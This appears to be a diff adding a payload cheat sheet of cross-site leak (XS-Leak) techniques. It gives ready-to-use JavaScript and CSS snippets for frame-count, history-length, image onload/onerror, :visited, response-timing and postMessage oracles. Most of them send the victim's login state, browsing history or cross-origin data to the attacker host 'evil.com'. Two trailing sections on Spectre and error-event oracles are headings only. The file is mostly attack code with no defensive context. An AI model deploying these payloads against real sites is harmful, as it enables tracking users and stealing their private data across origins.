@@ -1,0 +1,63 @@
+# ============================================================
+# XS-Leak — Cross-Site Information Leaks
+# ============================================================
+
+# ---- Frame Count Oracle ----
+# Count iframes/windows to determine state
+<script>
+var target = window.open("https://target.com/profile");
+setTimeout(function() {
+    // Count frames to determine login state
+    try {
+        var count = target.frames.length;
+        fetch("https://evil.com/?frames=" + count);
+    } catch(e) {}
+}, 1000);
+</script>
+
+# ---- History API Leak ----
+# After redirecting victim to target URL, check navigation count
+<script>
+var startLength = history.length;
+var t = window.open("https://target.com/login?redirect=/admin");
+setTimeout(function() {
+    // If redirected to /admin, history.length increased
+    fetch("https://evil.com/?delta=" + (history.length - startLength));
+}, 2000);
+</script>
+
+# ---- onload vs onerror Oracle ----
+<script>
+var img = new Image();
+img.onload = function() { /* user is logged in */ fetch("https://evil.com/?status=loggedin"); }
+img.onerror = function() { /* not logged in */ fetch("https://evil.com/?status=loggedout"); }
+img.src = "https://target.com/api/user/avatar?id=123";
+</script>
+
+# ---- CSS: :visited Oracle ----
+<style>#link:visited { background: url(https://evil.com/?visited=1) }</style>
+<a id="link" href="https://target.com/secret-page">x</a>
+
+# ---- Timing Oracle (response time) ----
+<script>
+var start = performance.now();
+fetch("https://target.com/search?q=secret", {mode:'no-cors'})
+  .then(() => {
+    var time = performance.now() - start;
+    fetch("https://evil.com/?time=" + time);
+  });
+</script>
+
+# ---- postMessage Leak ----
+# If target page posts messages with sensitive data:
+window.addEventListener('message', function(e) {
+    if(e.origin === 'https://target.com') {
+        fetch("https://evil.com/?data=" + JSON.stringify(e.data));
+    }
+});
+
+# ---- SharedArrayBuffer / Spectre (timing) ----
+# High-resolution timing to detect cache state
+
+# ---- Error Event Oracle ----
+# CSP report leak, SRI mismatch, etc.
